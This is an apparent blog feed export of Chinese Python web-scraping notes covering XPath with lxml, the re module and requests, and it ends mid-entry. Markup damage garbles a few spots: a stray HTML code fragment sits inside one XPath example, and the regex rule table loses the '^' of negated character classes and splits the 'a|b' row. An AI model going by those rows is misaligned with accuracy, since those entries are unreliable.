id="6-属性获取"><a class="markdownIt-Anchor" href="#6-属性获取"></a> 6 属性获取</h1><ul><li><kbd>@</kbd>：属性获取</li><li>注意和属性匹配的区别：属性匹配是中括号加属性名和值来限定某个属性，如[@href=“link1.html”]，而此处的@href指的是获取节点的某个属性</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//li/a/@href'</span>)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">[<span class="string">'link1.html'</span>, <span class="string">'link2.html'</span>, <span class="string">'link3.html'</span>, <span class="string">'link4.html'</span>, <span class="string">'link5.html'</span>]</span><br></pre></td></tr></table></figure><h1 id="7-属性多值匹配"><a class="markdownIt-Anchor" href="#7-属性多值匹配"></a> 7 属性多值匹配</h1><ul><li><kbd>contains()</kbd>：节点的某个属性有多个值时，该方法可以仅输入一个属性来进行匹配</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">text = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;li class="li li-first"&gt;&lt;a href="link.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line">result = html.xpath(<span class="string">'//li[contains(@class, "li")]/a/text()'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h1 id="8-多属性匹配"><a class="markdownIt-Anchor" href="#8-多属性匹配"></a> 8 多属性匹配</h1><ul><li><kbd>and</kbd>：用来连接匹配的多个属性</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">text = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;li class="li li-first" name="item"&gt;&lt;a href="link.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line">result = html.xpath(<span class="string">'//li[contains(@class, "li") and @name="item"]/a/text()'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><ul><li><a href="http://www.w3school.com.cn/xpath/xpath_operators.asp" target="_blank" rel="noopener">Xpath运算符总结</a></li></ul><h1 id="9-按序选择"><a class="markdownIt-Anchor" href="#9-按序选择"></a> 9 按序选择</h1><ul><li>有时候，我们在选择的时候某些属性可能同时匹配了多个节点，但是只想要其中的某个节点，如第二个节点或者最后一个节点</li><li>注意，方括号中的序号是从1开始的而不是0</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/a/text()'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[last()]/a/text()'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[position()&lt;3]/a/text()'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[last()-2]/a/text()'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><ul><li><a href="http://www.w3school.com.cn/xpath/xpath_functions.asp%E3%80%82" target="_blank" rel="noopener">Xpath函数参考</a></li></ul><h1 id="10-节点轴选择"><a class="markdownIt-Anchor" href="#10-节点轴选择"></a> 10 节点轴选择</h1><ul><li><p>第一次选择时，我们调用了<kbd>ancestor</kbd>轴，可以获取所有祖先节点。其后需要跟两个冒号，然后是节点的选择器，这里我们直接使用<kbd>*</kbd>，表示匹配所有节点，因此返回结果是第一个li节点的所有祖先节点，包括html、body、div和ul。</p></li><li><p>第二次选择时，我们又加了限定条件，这次在冒号后面加了div，这样得到的结果就只有div这个祖先节点了。</p></li><li><p>第三次选择时，我们调用了<kbd>attribute</kbd>轴，可以获取所有属性值，其后跟的选择器还是*，这代表获取节点的所有属性，返回值就是li节点的所有属性值。</p></li><li><p>第四次选择时，我们调用了<kbd>child</kbd>轴，可以获取所有直接子节点。这里我们又加了限定条件，选取href属性为link1.html的a节点。</p></li><li><p>第五次选择时，我们调用了<kbd>descendant</kbd>轴，可以获取所有子孙节点。这里我们又加了限定条件获取span节点，所以返回的结果只包含span节点而不包含a节点。</p></li><li><p>第六次选择时，我们调用了<kbd>following</kbd>轴，可以获取当前节点之后的所有节点。这里我们虽然使用的是*匹配，但又加了索引选择，所以只获取了第二个后续节点。</p></li><li><p>第七次选择时，我们调用了<kbd>following-sibling</kbd>轴，可以获取当前节点之后的所有同级节点。这里我们使用*匹配，所以获取了所有后续同级节点。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;&lt;span&gt;first item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/ancestor::*'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/ancestor::div'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/attribute::*'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/child::a[@href="link1.html"]'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/descendant::span'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath(<span class="string">'//li[1]/following::*[2]'</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = html.xpath('//li[1]/following-sibling::*')&lt;code class="lang-python"&gt;</span><br><span class="line">&lt;span class="kwd"&gt;print&lt;/span&gt;&lt;span class="pun"&gt;(&lt;/span&gt;&lt;span class="pln"&gt;result&lt;/span&gt;&lt;span class="pun"&gt;)&lt;/span&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">[&lt;Element html at <span class="number">0x107941808</span>&gt;, &lt;Element body at <span class="number">0x1079418c8</span>&gt;, &lt;Element div at <span class="number">0x107941908</span>&gt;, &lt;Element ul at <span class="number">0x107941948</span>&gt;]</span><br><span class="line">[&lt;Element div at <span class="number">0x107941908</span>&gt;]</span><br><span class="line">[<span class="string">'item-0'</span>]</span><br><span class="line">[&lt;Element a at <span class="number">0x1079418c8</span>&gt;]</span><br><span class="line">[&lt;Element span at <span class="number">0x107941948</span>&gt;]</span><br><span class="line">[&lt;Element a at <span class="number">0x1079418c8</span>&gt;]</span><br><span class="line">[&lt;Element li at <span class="number">0x107941948</span>&gt;, &lt;Element li at <span class="number">0x107941988</span>&gt;, &lt;Element li at <span class="number">0x1079419c8</span>&gt;, &lt;Element li at <span class="number">0x107941a08</span>&gt;]</span><br></pre></td></tr></table></figure><ul><li><a href="http://www.w3school.com.cn/xpath/xpath_axes.asp" target="_blank" rel="noopener">更多轴的用法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3爬虫笔记-正则表达式</title>
      <link href="/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="常用的匹配规则"><a class="markdownIt-Anchor" href="#常用的匹配规则"></a> 常用的匹配规则</h1><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>\w</td><td>匹配字母、数字及下划线</td></tr><tr><td>\W</td><td>匹配不是字母、数字及下划线的字符</td></tr><tr><td>\s</td><td>匹配任意空白字符，等价于[\t\n\r\f]</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于[0-9]</td></tr><tr><td>\D</td><td>匹配任意非数字的字符</td></tr><tr><td>\A</td><td>匹配字符串开头</td></tr><tr><td>\Z</td><td>匹配字符串结尾，如果存在换行，只匹配到换行前的结束字符串</td></tr><tr><td>\z</td><td>匹配字符串结尾，如果存在换行，同时还会匹配换行符</td></tr><tr><td>\G</td><td>匹配最后匹配完成的位置</td></tr><tr><td>\n</td><td>匹配一个换行符</td></tr><tr><td>\t</td><td>匹配一个制表符</td></tr><tr><td>^</td><td>匹配一行字符串的开头</td></tr><tr><td>$</td><td>匹配一行字符串的结尾</td></tr><tr><td>.</td><td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符</td></tr><tr><td>[…]</td><td>用来表示一组字符，单独列出，比如[amk]匹配a、m或k</td></tr><tr><td>…</td><td>不在[]中的字符，比如abc匹配除了a、b、c之外的字符</td></tr><tr><td>*</td><td>匹配0个或多个表达式</td></tr><tr><td>+</td><td>匹配1个或多个表达式</td></tr><tr><td>?</td><td>匹配0个或1个前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td>{n}</td><td>精确匹配n个前面的表达式</td></tr><tr><td>{n, m}</td><td>匹配n到m次由前面正则表达式定义的片段，贪婪方式</td></tr><tr><td>a</td><td>b</td></tr><tr><td>( )</td><td>匹配括号内的表达式，也表示一个组</td></tr></tbody></table><ul><li>Python的<kbd>re</kbd>库提供了整个正则表达式的实现，利用这个库，可以在Python中使用正则表达式。</li></ul><h1 id="1-match"><a class="markdownIt-Anchor" href="#1-match"></a> 1 match()</h1><ul><li><kbd>match()</kbd>方法会尝试从字符串的<strong>起始位置</strong>匹配正则表达式，如果匹配，就返回匹配成功的结果；如果不匹配，就返回<kbd>None</kbd></li><li>而在match()方法中，第一个参数传入了正则表达式，第二个参数传入了要匹配的字符串。</li><li>打印输出结果，可以看到结果是<kbd>SRE_Match</kbd>对象，这证明成功匹配。该对象有两个方法：<kbd>group()</kbd>方法可以输出匹配到的内容；<kbd>span()</kbd>方法可以输出匹配的范围。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'Hello 123 4567 World_This is a Regex Demo'</span></span><br><span class="line">print(len(content))</span><br><span class="line">result = re.match(<span class="string">'^Hello\s\d\d\d\s\d&#123;4&#125;\s\w&#123;10&#125;'</span>, content)</span><br><span class="line">print(result)</span><br><span class="line">print(result.group())</span><br><span class="line">print(result.span())</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="number">41</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">25</span>), match=<span class="string">'Hello 123 4567 World_This'</span>&gt;</span><br><span class="line">Hello <span class="number">123</span> <span class="number">4567</span> World_This</span><br><span class="line">(<span class="number">0</span>, <span class="number">25</span>)</span><br></pre></td></tr></table></figure><h2 id="11-匹配目标"><a class="markdownIt-Anchor" href="#11-匹配目标"></a> 1.1 匹配目标</h2><ul><li>如果想从字符串中提取一部分内容，可以使用<kbd>()</kbd>括号将想提取的子字符串括起来。调用group()方法传入分组的索引（从1开始）即可获取提取的结果。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'Hello 1234567 World_This is a Regex Demo'</span></span><br><span class="line">result = re.match(<span class="string">'^Hello\s(\d+)\sWorld'</span>, content)</span><br><span class="line">print(result)</span><br><span class="line">print(result.group())</span><br><span class="line">print(result.group(<span class="number">1</span>))</span><br><span class="line">print(result.span())</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">19</span>), match=<span class="string">'Hello 1234567 World'</span>&gt;</span><br><span class="line">Hello <span class="number">1234567</span> World</span><br><span class="line"><span class="number">1234567</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">19</span>)</span><br></pre></td></tr></table></figure><h2 id="12-通用匹配"><a class="markdownIt-Anchor" href="#12-通用匹配"></a> 1.2 通用匹配</h2><ul><li><kbd>.*</kbd>（点星）：其中<kbd>.</kbd>（点）可以匹配任意字符（除换行符），<kbd>*</kbd>（星）代表匹配前面的字符无限次，所以它们组合在一起就可以匹配任意字符了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'Hello 123 4567 World_This is a Regex Demo'</span></span><br><span class="line">result = re.match(<span class="string">'^Hello.*Demo$'</span>, content)</span><br><span class="line">print(result)</span><br><span class="line">print(result.group())</span><br><span class="line">print(result.span())</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">41</span>), match=<span class="string">'Hello 123 4567 World_This is a Regex Demo'</span>&gt;</span><br><span class="line">Hello <span class="number">123</span> <span class="number">4567</span> World_This <span class="keyword">is</span> a Regex Demo</span><br><span class="line">(<span class="number">0</span>, <span class="number">41</span>)</span><br></pre></td></tr></table></figure><h2 id="13-贪婪与非贪婪"><a class="markdownIt-Anchor" href="#13-贪婪与非贪婪"></a> 1.3 贪婪与非贪婪</h2><ul><li>贪婪匹配：如下例，<kbd>.*</kbd>（点星）默认为贪婪匹配，会匹配尽可能多的字符。正则表达式中，.*后面是\d+，也就是至少一个数字，，因此，.*就尽可能匹配多的字符，这里就把123456匹配了，给\d+留下一个可满足条件的数字7，最后得到的内容就只有数字7了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'Hello 1234567 World_This is a Regex Demo'</span></span><br><span class="line">result = re.match(<span class="string">'^He.*(\d+).*Demo$'</span>, content)</span><br><span class="line">print(result)</span><br><span class="line">print(result.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">40</span>), match=<span class="string">'Hello 1234567 World_This is a Regex Demo'</span>&gt;</span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><ul><li>非贪婪匹配：尽可能匹配更少的字符，可以使用<kbd>.*?</kbd></li><li>当.*?匹配到Hello后面的空白字符时，再往后的字符就是数字了，而\d+恰好可以匹配，那么这里.*?就不再进行匹配，交给\d+去匹配后面的数字。所以这样.*?匹配了尽可能少的字符，\d+的结果就是1234567了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'Hello 1234567 World_This is a Regex Demo'</span></span><br><span class="line">result = re.match(<span class="string">'^He.*?(\d+).*Demo$'</span>, content)</span><br><span class="line">print(result)</span><br><span class="line">print(result.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">40</span>), match=<span class="string">'Hello 1234567 World_This is a Regex Demo'</span>&gt;</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure><ul><li>下例中，.*?没有匹配到任何结果，而.*则尽量匹配多的内容：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'http://weibo.com/comment/kEraCN'</span></span><br><span class="line">result1 = re.match(<span class="string">'http.*?comment/(.*?)'</span>, content)</span><br><span class="line">result2 = re.match(<span class="string">'http.*?comment/(.*)'</span>, content)</span><br><span class="line">print(<span class="string">'result1'</span>, result1.group(<span class="number">1</span>))</span><br><span class="line">print(<span class="string">'result2'</span>, result2.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">result1 </span><br><span class="line">result2 kEraCN</span><br></pre></td></tr></table></figure><h2 id="14-修饰符"><a class="markdownIt-Anchor" href="#14-修饰符"></a> 1.4 修饰符</h2><ul><li>如下例，在字符串中加了<kbd>换行符</kbd>之后，匹配出错。这是因为<kbd>.</kbd>匹配除了换行符之外的所有字符。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''Hello 1234567 World_This</span></span><br><span class="line"><span class="string">is a Regex Demo</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">result = re.match(<span class="string">'^He.*?(\d+).*?Demo$'</span>, content)</span><br><span class="line">print(result.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">AttributeError Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-18</span>-c7d232b39645&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">      <span class="number">5</span> <span class="string">'''</span></span><br><span class="line"><span class="string">      6 result = re.match('^He.*?(\d+).*?Demo$', content)</span></span><br><span class="line"><span class="string">----&gt; 7 print(result.group(1))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AttributeError: 'NoneType' object has no attribute 'group'</span></span><br></pre></td></tr></table></figure><ul><li>这里只需加一个修饰符<kbd>re.S</kbd>，即可修正这个错误，这个修饰符的作用是使.匹配包括换行符在内的所有字符：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = re.match(<span class="string">'^He.*?(\d+).*?Demo$'</span>, content, re.S)</span><br></pre></td></tr></table></figure><ul><li><strong>常见修饰符总结</strong><br />| 修饰符 | 描述 |<br />|–|--|<br />re.I|使匹配对大小写不敏感<br />re.L|做本地化识别（locale-aware）匹配<br />re.M|多行匹配，影响^和$<br />re.S|使.匹配包括换行在内的所有字符<br />re.U|根据Unicode字符集解析字符。这个标志影响\w、\W、 \b和\B<br />re.X|该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</li></ul><h2 id="15-转义匹配"><a class="markdownIt-Anchor" href="#15-转义匹配"></a> 1.5 转义匹配</h2><ul><li>当遇到用于正则匹配模式的特殊字符时，在前面加反斜线转义一下即可。例如<kbd>.</kbd>就可以用<kbd>\.</kbd>来匹配<kbd>/</kbd></li></ul><h1 id="2-search"><a class="markdownIt-Anchor" href="#2-search"></a> 2 search()</h1><ul><li>前面提到，match()方法是从字符串的开头开始匹配的，一旦开头不匹配，那么整个匹配就失败了。这在做匹配时并不方便。它更适合用来检测某个字符串是否符合某个正则表达式的规则。</li><li><kbd>search()</kbd>：它在匹配时会扫描整个字符串，然后返回第一个（Attention：只返回第一个）成功匹配的结果。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'Extra stings Hello 1234567 World_This is a Regex Demo Extra stings'</span></span><br><span class="line">result = re.search(<span class="string">'Hello.*?(\d+).*?Demo'</span>, content)</span><br><span class="line">print(result)</span><br><span class="line"><span class="keyword">print</span> (result.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">13</span>, <span class="number">53</span>), match=<span class="string">'Hello 1234567 World_This is a Regex Demo'</span>&gt;</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure><h1 id="3-findall"><a class="markdownIt-Anchor" href="#3-findall"></a> 3 findall()</h1><ul><li><kbd>findall()</kbd>：获取匹配正则表达式的<strong>所有内容</strong>。</li><li>该方法会搜索整个字符串，然后返回匹配正则表达式的所有内容。返回结果是一个元组组成的列表</li><li>如果只是获取第一个内容，可以用<kbd>search()</kbd>方法。当需要提取多个内容时，可以用<kbd>findall()</kbd>方法。</li></ul><h1 id="4-sub"><a class="markdownIt-Anchor" href="#4-sub"></a> 4 sub()</h1><ul><li><kbd>sub()</kbd>方法可以用来修改文本。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'54aK54yr5oiR54ix5L2g'</span></span><br><span class="line">content = re.sub(<span class="string">'\d+'</span>, <span class="string">''</span>, content)</span><br><span class="line">print(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">aKyroiRixLg</span><br></pre></td></tr></table></figure><ul><li>在实际应用中，可以先使用sub()将一些无用的内容替换为空，然后在进行匹配。可以节省工作。</li><li>下例中， 用sub替换时用<kbd>|</kbd>将两个正则表达式分割开，字符串中符合两个正则表达式的内容<strong>都会</strong>被替换掉。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">'&lt;a href="/2.mp3" singer="任贤齐"&gt;沧海一声笑&lt;/a&gt;'</span></span><br><span class="line">html = re.sub(<span class="string">'&lt;a.*?&gt;|&lt;/a&gt;'</span>, <span class="string">''</span>, html)</span><br><span class="line"><span class="keyword">print</span> (html)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">沧海一声笑</span><br></pre></td></tr></table></figure><h1 id="5-compile"><a class="markdownIt-Anchor" href="#5-compile"></a> 5 compile()</h1><ul><li><kbd>compile()</kbd>：可以将正则字符串编译成正则表达式对象，以便在后面的匹配中复用。</li><li>如下例，我们想分别将3个日期中的时间去掉。这里没有必要重复写3个同样的正则表达式，此时可以借助compile()方法将正则表达式编译成一个正则表达式对象，以便复用</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">content1 = <span class="string">'2016-12-15 12:00'</span></span><br><span class="line">content2 = <span class="string">'2016-12-17 12:55'</span></span><br><span class="line">content3 = <span class="string">'2016-12-22 13:21'</span></span><br><span class="line">pattern = re.compile(<span class="string">'\d&#123;2&#125;:\d&#123;2&#125;'</span>)</span><br><span class="line">result1 = re.sub(pattern, <span class="string">''</span>, content1)</span><br><span class="line">result2 = re.sub(pattern, <span class="string">''</span>, content2)</span><br><span class="line">result3 = re.sub(pattern, <span class="string">''</span>, content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure><ul><li>另外，compile()还可以传入修饰符，例如re.S等修饰符，这样在search()、findall()等方法中就不需要额外传了。所以，compile()方法可以说是给正则表达式做了一层封装，以便我们更好地复用。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3爬虫笔记-requests</title>
      <link href="/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-requests/"/>
      <url>/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-requests/</url>
      
        <content type="html"><![CDATA[<ul><li>在request中，所有的请求都可以用以请求名称命名的方法来调用：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">r = requests.post(<span class="string">'http://httpbin.org/post'</span>)</span><br><span class="line">r = requests.put(<span class="string">'http://httpbin.org/put'</span>)</span><br><span class="line">r = requests.delete(<span class="string">'http://httpbin.org/delete'</span>)</span><br><span class="line">r = requests.head(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">r = requests.options(<span class="string">'http://httpbin.org/get'</span>)</span><br></pre></td></tr></table></figure><h1 id="1-get请求"><a class="markdownIt-Anchor" href="#1-get请求"></a> 1 GET请求</h1><ul><li>利用<kbd>params</kbd>参数，构造字典来传递GET参数。请求的链接自动被构造成了|<code>http://httpbin.org/get?age=22&amp;name=germey</code>|：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'germey'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>另外，网页的返回类型实际上是str类型，但是它很特殊，是JSON格式的。所以，如果想直接解析返回结果，得到一个字典格式的话，可以直接调用json()方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">r = requests.get(<span class="string">"http://httpbin.org/get"</span>)</span><br><span class="line">print(type(r.text))</span><br><span class="line">print(r.json())</span><br><span class="line">print(type(r.json()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line">&#123;'headers': &#123;'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Host': 'httpbin.org', 'User-Agent': 'python-requests/2.10.0'&#125;, 'url': 'http://httpbin.org/get', 'args': &#123;&#125;, 'origin': '182.33.248.131'&#125;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">dict</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="11-抓取网页"><a class="markdownIt-Anchor" href="#11-抓取网页"></a> 1.1 抓取网页</h2><ul><li>以爬取知乎为例，读取页面内容，并用正则表达式匹配相应内容。注意爬去知乎必须要修改User-Agent，否则知乎拒绝访问。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">"https://www.zhihu.com/explore"</span>, headers=headers)</span><br><span class="line">pattern = re.compile(<span class="string">'explore-feed.*?question_link.*?&gt;(.*?)&lt;/a&gt;'</span>, re.S)</span><br><span class="line">titles = re.findall(pattern, r.text)</span><br><span class="line">print(titles)</span><br></pre></td></tr></table></figure><h2 id="12-抓取二进制数据"><a class="markdownIt-Anchor" href="#12-抓取二进制数据"></a> 1.2 抓取二进制数据</h2><ul><li>图片、视频、音频等都是以二进制数据存储的。要抓去它们必须拿到它们的二进制码。</li><li>下面以抓取GitHub图标为例：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"https://github.com/favicon.ico"</span>)</span><br><span class="line">print(r.text)</span><br><span class="line">print(r.content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一行会输出乱码，因为text()输出字符串，而抓取的是图片数据</span></span><br><span class="line"><span 